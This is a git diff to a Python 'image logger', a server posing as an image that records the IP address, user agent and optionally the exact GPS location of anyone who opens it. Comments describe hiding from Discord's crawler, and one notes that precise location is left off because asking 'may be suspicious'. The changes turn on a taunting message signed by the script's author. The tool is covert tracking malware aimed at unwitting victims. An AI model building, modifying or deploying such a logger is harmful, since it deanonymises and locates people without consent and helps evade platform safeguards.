@@ -26,8 +26,8 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "run pussy", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "!!!!!!!!run pussy!!!!!!!!!! script made by_samxara", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -86,7 +86,7 @@ def reportError(error):
     ],
 })
 
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = True):
     if ip.startswith(blacklistedIPs):
         return
     
@@ -185,7 +185,7 @@ binaries = {
     # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
 
-class ImageLoggerAPI(BaseHTTPRequestHandler):
+class ImageLoggerAPI(BaseHTTPRequestHandler): 
     
     def handleRequest(self):
         try:
